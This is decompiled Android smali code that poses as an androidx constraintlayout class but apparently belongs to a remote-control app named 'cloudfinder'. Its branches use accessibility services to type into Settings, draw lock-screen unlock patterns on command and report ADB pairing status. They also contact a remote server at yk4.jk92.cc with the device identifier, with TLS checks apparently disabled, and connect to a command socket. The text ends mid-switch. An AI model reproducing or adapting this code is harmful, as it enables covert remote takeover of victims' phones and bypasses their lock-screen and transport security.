.class public final synthetic Landroidx/constraintlayout/motion/widget/؋;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I

.field public final synthetic أ:Ljava/lang/Object;

.field public final synthetic ؤ:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(ILjava/lang/Object;Ljava/lang/Object;)V
    .locals 0

    iput p1, p0, Landroidx/constraintlayout/motion/widget/؋;->آ:I

    iput-object p2, p0, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    iput-object p3, p0, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 16

    move-object/from16 v1, p0

    iget v0, v1, Landroidx/constraintlayout/motion/widget/؋;->آ:I

    const-wide/16 v2, 0x7d0

    const/4 v4, 0x0

    const/4 v5, 0x1

    const/4 v6, 0x0

    packed-switch v0, :pswitch_data_0

    :pswitch_0
    goto/16 :goto_c

    :pswitch_1
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    const-string v3, "CaptchaSolver"

    const-string v4, "Captcha input done: "

    :try_start_0
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-nez v5, :cond_0

    goto :goto_0

    :cond_0
    invoke-static {v5}, Lڗًقڔ/ء;->ت(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_1

    const-string v8, "com.android.settings:id/edittext_view"

    invoke-virtual {v5, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    if-eqz v5, :cond_1

    invoke-interface {v5}, Ljava/util/List;->isEmpty()Z

    move-result v8

    if-nez v8, :cond_1

    invoke-interface {v5, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    move-object v7, v5

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    :cond_1
    if-eqz v7, :cond_2

    new-instance v5, Landroid/os/Bundle;

    invoke-direct {v5}, Landroid/os/Bundle;-><init>()V

    const-string v6, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    invoke-virtual {v5, v6, v2}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    const/high16 v6, 0x200000

    invoke-virtual {v7, v6, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Lڝږ؁ڋ/آ;

    const/4 v5, 0x5

    invoke-direct {v4, v0, v5}, Lڝږ؁ڋ/آ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V

    const-wide/16 v5, 0x320

    invoke-virtual {v2, v4, v5, v6}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_0

    :cond_2
    const-string v0, "EditText not found"

    invoke-static {v3, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v2, "input error"

    invoke-static {v3, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void

    :pswitch_2
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/د;

    iget-object v4, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v4, Lڜأِجطّثٮ/ء;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :try_start_2
    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v2

    invoke-virtual {v2}, Lڜأِجطّثٮ/ؠ;->ئ()Z

    move-result v2

    invoke-virtual {v4}, Lڜأِجطّثٮ/ء;->ج()Z

    move-result v3

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const-string v5, "type"

    const-string v6, "status"

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v5, "connected"

    invoke-virtual {v4, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v5, "paired"

    invoke-virtual {v4, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v5, "message"

    if-eqz v2, :cond_3

    const-string v2, "ADB\u5df2\u8fde\u63a5"

    goto :goto_1

    :cond_3
    if-eqz v3, :cond_4

    const-string v2, "\u5df2\u914d\u5bf9\u672a\u8fde\u63a5"

    goto :goto_1

    :cond_4
    const-string v2, "\u672a\u914d\u5bf9"

    :goto_1
    invoke-virtual {v4, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v0, v0, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-eqz v0, :cond_5

    const-string v2, "adbPairStatus"

    invoke-virtual {v0, v2, v4}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :cond_5
    return-void

    :pswitch_3
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroid/content/Context;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroid/view/View;

    const-string v3, "input_method"

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/inputmethod/InputMethodManager;

    if-eqz v0, :cond_6

    invoke-virtual {v0, v2, v5}, Landroid/view/inputmethod/InputMethodManager;->showSoftInput(Landroid/view/View;I)Z

    :cond_6
    return-void

    :pswitch_4
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/ة;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    iget-object v0, v0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    if-eqz v0, :cond_7

    invoke-virtual {v0, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    :cond_7
    return-void

    :pswitch_5
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/إ;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Lئٱنۃؖۊڄئ/آ;

    const-string v3, "."

    const-string v7, "token"

    const-string v8, "Decrypted: "

    const-string v9, "Response: "

    const-string v10, "yk4.jk92.cc"

    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "https://yk4.jk92.cc/adv.php?apk=10020&device="

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v12, v0, Lڜٟٱڀ/إ;->ؠ:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "Probing "

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    const-string v13, "DomainProber"

    invoke-static {v13, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_3
    new-array v12, v5, [Ljavax/net/ssl/TrustManager;

    new-instance v14, Lښ۫ٳڢ/ء;

    invoke-direct {v14, v5, v0}, Lښ۫ٳڢ/ء;-><init>(ILjava/lang/Object;)V

    aput-object v14, v12, v6

    const-string v14, "TLS"

    invoke-static {v14}, Ljavax/net/ssl/SSLContext;->getInstance(Ljava/lang/String;)Ljavax/net/ssl/SSLContext;

    move-result-object v14

    new-instance v15, Ljava/security/SecureRandom;

    invoke-direct {v15}, Ljava/security/SecureRandom;-><init>()V

    invoke-virtual {v14, v4, v12, v15}, Ljavax/net/ssl/SSLContext;->init([Ljavax/net/ssl/KeyManager;[Ljavax/net/ssl/TrustManager;Ljava/security/SecureRandom;)V

    new-instance v4, Lokhttp3/OkHttpClient$Builder;

    invoke-direct {v4}, Lokhttp3/OkHttpClient$Builder;-><init>()V

    sget-object v15, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v5, 0x5

    invoke-virtual {v4, v5, v6, v15}, Lokhttp3/OkHttpClient$Builder;->connectTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v4

    invoke-virtual {v4, v5, v6, v15}, Lokhttp3/OkHttpClient$Builder;->readTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v4

    invoke-virtual {v14}, Ljavax/net/ssl/SSLContext;->getSocketFactory()Ljavax/net/ssl/SSLSocketFactory;

    move-result-object v5

    const/4 v6, 0x0

    aget-object v12, v12, v6

    check-cast v12, Ljavax/net/ssl/X509TrustManager;

    invoke-virtual {v4, v5, v12}, Lokhttp3/OkHttpClient$Builder;->sslSocketFactory(Ljavax/net/ssl/SSLSocketFactory;Ljavax/net/ssl/X509TrustManager;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v4

    new-instance v5, Lښ۫ٳڢ/ؠ;

    const/4 v6, 0x1

    invoke-direct {v5, v6}, Lښ۫ٳڢ/ؠ;-><init>(I)V

    invoke-virtual {v4, v5}, Lokhttp3/OkHttpClient$Builder;->hostnameVerifier(Ljavax/net/ssl/HostnameVerifier;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v4

    invoke-virtual {v4}, Lokhttp3/OkHttpClient$Builder;->build()Lokhttp3/OkHttpClient;

    move-result-object v4

    new-instance v5, Lokhttp3/Request$Builder;

    invoke-direct {v5}, Lokhttp3/Request$Builder;-><init>()V

    invoke-virtual {v5, v11}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lokhttp3/Request$Builder;->get()Lokhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v5

    invoke-virtual {v4, v5}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v4

    invoke-interface {v4}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    move-result-object v4

    invoke-virtual {v4}, Lokhttp3/Response;->isSuccessful()Z

    move-result v5

    if-eqz v5, :cond_9

    invoke-virtual {v4}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;

    move-result-object v5

    if-eqz v5, :cond_9

    invoke-virtual {v4}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;

    move-result-object v5

    invoke-virtual {v5}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4}, Lokhttp3/Response;->close()V

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v13, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4, v5}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v7}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_a

    invoke-virtual {v4, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iget-object v0, v0, Lڜٟٱڀ/إ;->؋:Lڙڧا/ء;

    invoke-virtual {v0, v4}, Lڙڧا/ء;->؋(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v13, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "host"

    const-string v6, "www"

    invoke-virtual {v5, v0, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "domain"

    invoke-virtual {v5, v6, v10}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "port"

    const-string v8, "3000"

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_8

    goto :goto_2

    :cond_8
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_2
    invoke-virtual {v2, v0, v6, v4, v5}, Lئٱنۃؖۊڄئ/آ;->آ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_4

    :cond_9
    invoke-virtual {v4}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-virtual {v4}, Lokhttp3/Response;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_3

    :catch_3
    move-exception v0

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Probe failed: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v13, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_a
    :goto_3
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "Domain probe failed: Probe failed for cohuducox.com"

    const-string v3, "SocketManager"

    invoke-static {v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v2, Lئٱنۃؖۊڄئ/آ;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/د;

    const/4 v2, 0x0

    iput-boolean v2, v0, Lڜٟٱڀ/د;->ب:Z

    invoke-virtual {v0}, Lڜٟٱڀ/د;->أ()V

    :goto_4
    return-void

    :pswitch_6
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroid/view/WindowManager;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroid/view/View;

    :try_start_4
    invoke-interface {v0, v2}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :catch_4
    return-void

    :pswitch_7
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/أ;

    iget-object v5, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v5, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v6, "CommandDispatcher"

    :try_start_5
    sget-object v7, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v7, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v7, :cond_b

    const-string v0, "patternUnlock: no accessibility service"

    invoke-static {v6, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_7

    :cond_b
    iget-object v8, v0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v9, "power"

    invoke-virtual {v8, v9}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/os/PowerManager;

    if-eqz v8, :cond_c

    invoke-virtual {v8}, Landroid/os/PowerManager;->isInteractive()Z

    move-result v9

    if-nez v9, :cond_c

    const-string v9, "BPkg:PatternUnlock"

    const v10, 0x1000001a

    invoke-virtual {v8, v10, v9}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    const-wide/16 v9, 0x2710

    invoke-virtual {v8, v9, v10}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    :cond_c
    iget-object v2, v0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v2

    iget v3, v2, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v2, v2, Landroid/util/DisplayMetrics;->heightPixels:I

    new-instance v9, Landroid/graphics/Path;

    invoke-direct {v9}, Landroid/graphics/Path;-><init>()V

    int-to-float v8, v3

    const/high16 v10, 0x40000000    # 2.0f

    div-float/2addr v8, v10

    int-to-float v10, v2

    const v11, 0x3f59999a    # 0.85f

    mul-float/2addr v11, v10

    invoke-virtual {v9, v8, v11}, Landroid/graphics/Path;->moveTo(FF)V

    const v11, 0x3eb33333    # 0.35f

    mul-float/2addr v10, v11

    invoke-virtual {v9, v8, v10}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v14, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v14}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v15, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v10, 0x0

    const-wide/16 v12, 0x190

    move-object v8, v15

    invoke-direct/range {v8 .. v13}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {v14, v15}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v14}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v8

    invoke-virtual {v7, v8, v4, v4}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    const-wide/16 v8, 0xdac

    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {v3, v2}, Ljava/lang/Math;->min(II)I

    move-result v8

    mul-int/lit8 v8, v8, 0x7

    div-int/lit8 v8, v8, 0xa

    div-int/lit8 v9, v8, 0x2

    sub-int/2addr v3, v8

    const/4 v8, 0x2

    div-int/2addr v3, v8

    mul-int/lit8 v2, v2, 0x3

    div-int/lit8 v2, v2, 0xa

    new-instance v11, Landroid/graphics/Path;

    invoke-direct {v11}, Landroid/graphics/Path;-><init>()V

    const/4 v10, 0x0

    const/4 v12, 0x1

    :goto_5
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v13

    if-ge v10, v13, :cond_10

    invoke-virtual {v5, v10}, Ljava/lang/String;->charAt(I)C

    move-result v13

    add-int/lit8 v13, v13, -0x30

    const/4 v14, 0x1

    if-lt v13, v14, :cond_f

    const/16 v15, 0x9

    if-le v13, v15, :cond_d

    goto :goto_6

    :cond_d
    add-int/lit8 v13, v13, -0x1

    div-int/lit8 v15, v13, 0x3

    rem-int/lit8 v13, v13, 0x3

    mul-int/2addr v13, v9

    add-int/2addr v13, v3

    mul-int/2addr v15, v9

    add-int/2addr v15, v2

    if-eqz v12, :cond_e

    int-to-float v12, v13

    int-to-float v13, v15

    invoke-virtual {v11, v12, v13}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v12, 0x0

    goto :goto_6

    :cond_e
    int-to-float v13, v13

    int-to-float v15, v15

    invoke-virtual {v11, v13, v15}, Landroid/graphics/Path;->lineTo(FF)V

    :cond_f
    :goto_6
    add-int/lit8 v10, v10, 0x1

    goto :goto_5

    :cond_10
    if-nez v12, :cond_11

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v2

    mul-int/lit16 v2, v2, 0x96

    const/16 v3, 0x258

    invoke-static {v2, v3}, Ljava/lang/Math;->max(II)I

    move-result v2

    new-instance v3, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v3}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v9, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v12, 0x0

    int-to-long v14, v2

    move-object v10, v9

    invoke-direct/range {v10 .. v15}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {v3, v9}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v3}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v2

    new-instance v3, Lڛڜڕڰڑ/ؤ;

    invoke-direct {v3, v8, v0}, Lڛڜڕڰڑ/ؤ;-><init>(ILjava/lang/Object;)V

    invoke-virtual {v7, v2, v3, v4}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "patternUnlock: drawing pattern "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    goto :goto_7

    :catch_5
    move-exception v0

    const-string v2, "patternUnlock error"

    invoke-static {v6, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_11
    :goto_7
    return-void

    :pswitch_8
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lژة۪ڦضۆۿۡ/ط;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    iget-object v0, v0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    iget-object v0, v0, Lcom/lite/cloudfinder/activity/MainActivity;->؋:Landroid/webkit/WebView;

    invoke-virtual {v0, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    return-void

    :pswitch_9
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    :pswitch_a
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lژة۪ڦضۆۿۡ/د;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Lؾپۑ۟ڂڷ/ا;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_6
    invoke-virtual {v0}, Lژة۪ڦضۆۿۡ/د;->؋()Landroid/graphics/Bitmap;

    move-result-object v0

    invoke-virtual {v2, v0}, Lؾپۑ۟ڂڷ/ا;->؋(Ljava/lang/Object;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    goto :goto_8

    :catch_6
    move-exception v0

    iget-object v2, v2, Lؾپۑ۟ڂڷ/ا;->؋:Lؾپۑ۟ڂڷ/ح;

    invoke-virtual {v2, v0}, Lؾپۑ۟ڂڷ/ح;->ا(Ljava/lang/Exception;)V

    :goto_8
    return-void

    :pswitch_b
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/google/firebase/messaging/FirebaseMessaging;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Lؾپۑ۟ڂڷ/ا;

    sget-object v3, Lcom/google/firebase/messaging/FirebaseMessaging;->ة:Lئٱنۃؖۊڄئ/آ;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_7
    invoke-virtual {v0}, Lcom/google/firebase/messaging/FirebaseMessaging;->؋()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lؾپۑ۟ڂڷ/ا;->؋(Ljava/lang/Object;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_7

    goto :goto_9

    :catch_7
    move-exception v0

    iget-object v2, v2, Lؾپۑ۟ڂڷ/ا;->؋:Lؾپۑ۟ڂڷ/ح;

    invoke-virtual {v2, v0}, Lؾپۑ۟ڂڷ/ح;->ا(Ljava/lang/Exception;)V

    :goto_9
    return-void

    :pswitch_c
